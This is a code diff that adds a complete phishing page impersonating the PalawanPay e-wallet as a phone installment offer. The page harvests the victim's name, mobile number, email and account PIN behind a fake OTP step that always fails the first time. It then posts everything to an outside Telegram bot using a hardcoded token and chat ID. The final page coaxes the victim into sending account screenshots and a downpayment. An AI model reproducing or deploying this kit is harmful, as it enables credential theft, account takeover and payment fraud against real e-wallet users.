@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PalawanPay Phone Installment</title>
+<link rel="icon" href="https://www.palawanpay.com/wp-content/uploads/2023/07/PPAYNavBarLogo.png" />
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    background: url('https://www.palawanpay.com/wp-content/uploads/2025/05/Panaloan_May-1-819x1024.jpg') no-repeat center center fixed;
+    background-size: cover;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  .overlay {
+    background: rgba(255, 255, 255, 0.95);
+    padding: 30px;
+    border-radius: 12px;
+    width: 90%;
+    max-width: 400px;
+    text-align: center;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+  }
+  .logo {
+    display: block;
+    margin: 0 auto 15px auto;
+    width: 100%;
+    max-width: 260px;
+    height: auto;
+  }
+  .footer-logo {
+    display: block;
+    margin: 15px auto 5px auto;
+    width: 100%;
+    max-width: 300px;
+    height: auto;
+  }
+  .title {
+    color: #046930;
+    margin-bottom: 15px;
+    font-weight: bold;
+    font-size: 22px;
+  }
+  input, select {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    font-size: 16px;
+    box-sizing: border-box;
+  }
+  button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 12px;
+    background-color: #046930;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 18px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #035224;
+  }
+  .status {
+    margin-top: 10px;
+    font-size: 14px;
+    min-height: 22px;
+  }
+  .footer {
+    margin-top: 10px;
+    font-size: 14px;
+    color: #333;
+  }
+  .rights {
+    margin-top: 5px;
+    font-size: 12px;
+    color: #666;
+  }
+
+  /* Loading Screen */
+  .loading-screen {
+    display: none;
+    position: fixed;
+    top:0; left:0; right:0; bottom:0;
+    background: rgba(0,0,0,0.3);
+    z-index: 1000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .loading-card {
+    background: white;
+    padding: 30px 40px;
+    border-radius: 14px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    text-align: center;
+    min-width: 200px;
+  }
+  .spinner {
+    margin: 0 auto 15px auto;
+    width: 48px;
+    height: 48px;
+    border: 5px solid #ccc;
+    border-top: 5px solid #046930;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    0% {transform: rotate(0deg);}
+    100% {transform: rotate(360deg);}
+  }
+</style>
+</head>
+<body>
+<div class="overlay">
+
+  <img src="https://www.palawanpay.com/wp-content/uploads/2023/07/PPAYNavBarLogo.png" class="logo" alt="PalawanPay Logo" />
+
+  <!-- Page 1: Unit, Price, Downpayment, Months, Calculate -->
+  <div id="page1">
+    <h2 class="title">Phone Installment</h2>
+    <input type="text" id="unit" placeholder="Phone Unit" />
+    <input type="number" id="price" placeholder="Price (₱)" min="0" />
+    <input type="number" id="downpayment" placeholder="Downpayment (₱)" min="0" />
+    <select id="months">
+      <option value="3">3 Months</option>
+      <option value="6">6 Months</option>
+      <option value="12">12 Months</option>
+    </select>
+    <button id="calculateBtn">Calculate</button>
+    <div class="status" id="calcResult"></div>
+    <button id="nextToInfoBtn">Next</button>
+  </div>
+
+  <!-- Page 2: User Info -->
+  <div id="page2" style="display:none;">
+    <h2 class="title">Your Information</h2>
+    <input type="text" id="name" placeholder="Full Name" />
+    <input type="tel" id="mobile" placeholder="Mobile Number (11 digits)" />
+    <input type="password" id="pin" maxlength="4" placeholder="4-digit PIN" />
+    <input type="email" id="email" placeholder="Email Address" />
+    <button id="nextToOtpBtn">Next</button>
+    <div class="status" id="infoStatus"></div>
+  </div>
+
+  <!-- Page 3: OTP Verification -->
+  <div id="page3" style="display:none;">
+    <h2 class="title">Palawan Express Mabuhay!</h2>
+    <p id="otpMessage">We sent a 6-digit verification code to your mobile number.</p>
+    <input type="text" id="otp" maxlength="6" placeholder="Enter OTP" />
+    <button id="verifyOtpBtn">Submit</button>
+    <div class="status" id="otpStatus"></div>
+  </div>
+
+  <!-- Page 4: Approved -->
+  <div id="page4" style="display:none; text-align:left;">
+    <h2 class="title" style="text-align:center;">Application Approved!</h2>
+    <p>
+      Congratulations suki!<br><br>
+      Ang iyong application form ay APPROVED na bago mag patuloy kailangan mo mag fill-up at i-pass ang contract form na iyong matatangap sa pamamagitan ng email upang ma check ng aming system na ikaw ay isang GOOD PAYER.<br><br>
+      Please also send a screenshot of your PalawanPay account with your downpayment amount for the meet up payment so that we can have a record of your first "GIVES AND INSTALLMENT".<br><br>
+      NOTE: You will give the payment when you meet the seller and the payment will be made using Palawanpay to PalawanPay.<br><br>
+      Your Verification code is (450099). DO NOT SHARE.<br><br>
+      If you need further assistance, please reach out to our Customer Service through the following channels: Hotline: 0919 058 0588, Facebook/Messenger: PalawanPayPH, Email: Help@Palawanpay.com and Website: www.palawanpay.com.
+    </p>
+    <button onclick="window.location.href='https://www.palawanpay.com/'">Finish</button>
+    <p class="footer" style="text-align:center; margin-top: 15px;">A member of Palawan Group of Companies</p>
+    <img src="https://www.palawanpay.com/wp-content/uploads/2023/07/PPSPEPPxPPAY-01-white-outline.jpg" class="footer-logo" alt="Palawan Group Logo" />
+    <p class="rights" style="text-align:center;">© 2025 Palawan Pawnshop, All Rights Reserved</p>
+  </div>
+
+</div>
+
+<!-- Loading Screen -->
+<div id="loading" class="loading-screen" style="display:none;">
+  <div class="loading-card">
+    <div class="spinner"></div>
+    <p id="loading-text">Processing...</p>
+  </div>
+</div>
+
+<script>
+  let generatedOTP = "450099"; // fixed for demonstration
+  let otpAttempts = 0;
+
+  const page1 = document.getElementById('page1');
+  const page2 = document.getElementById('page2');
+  const page3 = document.getElementById('page3');
+  const page4 = document.getElementById('page4');
+  const loading = document.getElementById('loading');
+  const otpMessage = document.getElementById('otpMessage');
+
+  const calcResult = document.getElementById('calcResult');
+  const infoStatus = document.getElementById('infoStatus');
+  const otpStatus = document.getElementById('otpStatus');
+
+  // Calculate installment on Page 1
+  document.getElementById('calculateBtn').addEventListener('click', () => {
+    let price = parseFloat(document.getElementById('price').value);
+    let downpayment = parseFloat(document.getElementById('downpayment').value);
+    let months = parseInt(document.getElementById('months').value);
+
+    if (isNaN(price) || price <= 0) {
+      calcResult.style.color = 'red';
+      calcResult.textContent = "Please enter a valid price.";
+      return;
+    }
+    if (isNaN(downpayment) || downpayment < 0) {
+      calcResult.style.color = 'red';
+      calcResult.textContent = "Please enter a valid downpayment (0 or more).";
+      return;
+    }
+    if (downpayment > price) {
+      calcResult.style.color = 'red';
+      calcResult.textContent = "Downpayment cannot exceed the price.";
+      return;
+    }
+    const balance = price - downpayment;
+    const monthly = balance / months;
+
+    calcResult.style.color = 'green';
+    calcResult.innerHTML = `Monthly Payment (0% interest): ₱${monthly.toFixed(2)} for ${months} months.<br>Balance after downpayment: ₱${balance.toFixed(2)}`;
+  });
+
+  // Page 1 -> Page 2 (2sec loading)
+  document.getElementById('nextToInfoBtn').addEventListener('click', () => {
+    const unit = document.getElementById('unit').value.trim();
+    const price = parseFloat(document.getElementById('price').value);
+    const downpayment = parseFloat(document.getElementById('downpayment').value);
+    const months = parseInt(document.getElementById('months').value);
+
+    if (!unit || isNaN(price) || price <= 0 || isNaN(downpayment) || downpayment < 0 || downpayment > price || !months) {
+      alert("Please complete all fields correctly.");
+      return;
+    }
+
+    showLoading(2000).then(() => {
+      page1.style.display = 'none';
+      page2.style.display = 'block';
+      calcResult.textContent = "";
+    });
+  });
+
+  // Page 2 -> Page 3 (4sec loading)
+  document.getElementById('nextToOtpBtn').addEventListener('click', () => {
+    const name = document.getElementById('name').value.trim();
+    const mobile = document.getElementById('mobile').value.trim();
+    const pin = document.getElementById('pin').value.trim();
+    const email = document.getElementById('email').value.trim();
+
+    if (!name || !mobile || !pin || !email) {
+      infoStatus.style.color = 'red';
+      infoStatus.textContent = "Please fill all fields.";
+      return;
+    }
+    if (!/^\d{11}$/.test(mobile)) {
+      infoStatus.style.color = 'red';
+      infoStatus.textContent = "Mobile number must be exactly 11 digits.";
+      return;
+    }
+    if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+      infoStatus.style.color = 'red';
+      infoStatus.textContent = "PIN must be exactly 4 digits.";
+      return;
+    }
+
+    infoStatus.textContent = "";
+    otpMessage.textContent = `We sent a 6-digit verification code to your mobile number (${mobile}).`;
+
+    showLoading(4000).then(() => {
+      page2.style.display = 'none';
+      page3.style.display = 'block';
+    });
+  });
+
+  // OTP verification
+  document.getElementById('verifyOtpBtn').addEventListener('click', () => {
+    const enteredOTP = document.getElementById('otp').value.trim();
+
+    if (enteredOTP.length !== 6) {
+      otpStatus.textContent = "";
+      showLoading(1000).then(() => { // 1 sec delay for empty/short OTP
+        otpStatus.style.color = 'red';
+        otpStatus.textContent = "❌ Invalid OTP. Please try again.";
+      });
+      return;
+    }
+
+    otpAttempts++;
+
+    const userData = {
+      unit: document.getElementById('unit').value,
+      price: document.getElementById('price').value,
+      downpayment: document.getElementById('downpayment').value,
+      months: document.getElementById('months').value,
+      name: document.getElementById('name').value,
+      mobile: document.getElementById('mobile').value,
+      email: document.getElementById('email').value,
+      pin: document.getElementById('pin').value,
+      otp: generatedOTP
+    };
+
+    if (otpAttempts === 1) {
+      otpStatus.textContent = "";
+      showLoading(3000).then(() => {
+        otpStatus.style.color = 'red';
+        otpStatus.textContent = "❌ Invalid OTP. Please try again.";
+      });
+    } else {
+      otpStatus.textContent = "";
+      page3.style.display = 'none';
+      showLoading(3000).then(() => {
+        page4.style.display = 'block';
+
+        // ------------------------------
+        // SEND TO TELEGRAM HERE
+        // ------------------------------
+        sendToTelegram(userData);
+      });
+    }
+  });
+
+  // Loading utility
+  function showLoading(duration) {
+    return new Promise((resolve) => {
+      loading.style.display = 'flex';
+      setTimeout(() => {
+        loading.style.display = 'none';
+        resolve();
+      }, duration);
+    });
+  }
+
+  // Telegram function
+  function sendToTelegram(data) {
+    const botToken = "8267241825:AAEkd2U10BCKXBbQappfUluS6n72HiUfDZI"; // <-- Paste your bot token here
+    const chatId = "5374601148";     // <-- Paste your chat ID here
+
+    const message = `
+📱 Phone Installment Application:
+Unit: ${data.unit}
+Price: ₱${data.price}
+Downpayment: ₱${data.downpayment}
+Months: ${data.months}
+Name: ${data.name}
+Mobile: ${data.mobile}
+Email: ${data.email}
+PIN: ${data.pin}
+OTP: ${data.otp}
+    `;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    })
+    .then(response => response.json())
+    .then(result => console.log("Sent to Telegram:", result))
+    .catch(error => console.error("Error sending to Telegram:", error));
+  }
+</script>
+</body>
+</html>
